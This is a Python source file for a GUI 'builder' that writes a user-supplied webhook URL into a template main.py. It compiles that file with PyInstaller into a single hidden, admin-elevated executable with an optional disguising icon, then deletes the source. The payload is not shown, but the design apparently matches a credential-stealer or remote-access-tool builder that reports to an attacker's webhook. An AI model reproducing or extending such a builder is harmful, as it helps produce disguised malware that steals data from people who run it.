import eel
import os
import subprocess
import sys
import time
import threading
from tkinter import filedialog
import tkinter as tk

eel.init('web')

icon_path = None
build_in_progress = False

@eel.expose
def configure_webhook_and_build(webhook_url, use_icon):
    global build_in_progress
    
    if build_in_progress:
        return {"success": False, "message": "Build already in progress"}
    
    build_in_progress = True
    
    try:
        eel.update_status("Building...")
        eel.add_console_output("🔧 Starting build process...", "info")
        

        eel.add_console_output("📝 Configuring webhook...", "info")
        configure_webhook(webhook_url)

        eel.add_console_output("🔨 Building executable with PyInstaller...", "info")
        success = build_executable(use_icon)
        
        if success:
            eel.add_console_output("✅ Build completed successfully!", "success")
            eel.add_console_output("📁 Executable ready in 'dist' folder", "success")
            eel.update_status("Build Successful")
            return {"success": True, "message": "Build completed successfully!"}
        else:
            eel.add_console_output("❌ Build failed", "error")
            eel.update_status("Build Failed")
            return {"success": False, "message": "Build failed"}
            
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        if sys.exc_info()[2]:
            error_msg += f" | Line: {sys.exc_info()[2].tb_lineno}"
        
        eel.add_console_output(f"❌ {error_msg}", "error")
        eel.update_status("Error")
        return {"success": False, "message": error_msg}
    
    finally:
        build_in_progress = False

def configure_webhook(webhook_url):
    try:
        with open("main.py", "r", encoding='utf-8') as file:
            content = file.read()

        configured_content = content.replace('hk = "%WEBHOOK%"', f'hk = "{webhook_url}"')

        with open("main.py", "w", encoding='utf-8') as file:
            file.write(configured_content)
            
        eel.add_console_output("✅ Webhook configured successfully", "success")
        return True
        
    except Exception as e:
        eel.add_console_output(f"❌ Failed to configure webhook: {e}", "error")
        return False

def build_executable(use_icon):
    try:
        pyinstaller_cmd = [
            "pyinstaller", 
            "--onefile", 
            "--noconsole", 
            "--uac-admin", 
            "main.py"
        ]

        if use_icon and icon_path:
            pyinstaller_cmd.extend(["--icon", icon_path])
            eel.add_console_output(f"🎨 Using icon: {os.path.basename(icon_path)}", "info")
        
        eel.add_console_output(f"⚡ Running: {' '.join(pyinstaller_cmd)}", "info")

        process = subprocess.run(
            pyinstaller_cmd, 
            capture_output=True, 
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )

        if os.path.exists("main.py"):
            os.remove("main.py")
            eel.add_console_output("🧹 Cleaned up temporary files", "info")

        if process.returncode == 0:
            eel.add_console_output("🎉 PyInstaller completed successfully", "success")
            return True
        else:
            eel.add_console_output("❌ PyInstaller failed:", "error")
            eel.add_console_output(process.stderr, "error")
            return False
            
    except Exception as e:
        eel.add_console_output(f"❌ Build error: {e}", "error")
        return False

@eel.expose
def select_icon():
    global icon_path
    
    def file_dialog():
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        
        file_path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[
                ("Icon files", "*.ico"),
                ("Image files", "*.png *.jpg *.jpeg"),
                ("All files", "*.*")
            ]
        )
        
        root.destroy()
        
        if file_path:
            global icon_path
            icon_path = file_path
            eel.icon_selected(os.path.basename(file_path))
            return file_path
        return None

    thread = threading.Thread(target=file_dialog)
    thread.daemon = True
    thread.start()

@eel.expose
def get_icon_path():
    return icon_path

@eel.expose
def clear_console(): 
    pass  

if __name__ == '__main__':
    try:
        eel.start('index.html', 
                 size=(800, 600), 
                 position=(200, 100),
                 disable_cache=True,
                 mode='chrome',
                 cmdline_args=['--disable-web-security', '--allow-running-insecure-content'])
    except Exception as e:
        print(f"Failed to start GUI: {e}")
        print("Make sure you have Chrome/Chromium installed or try running with different mode")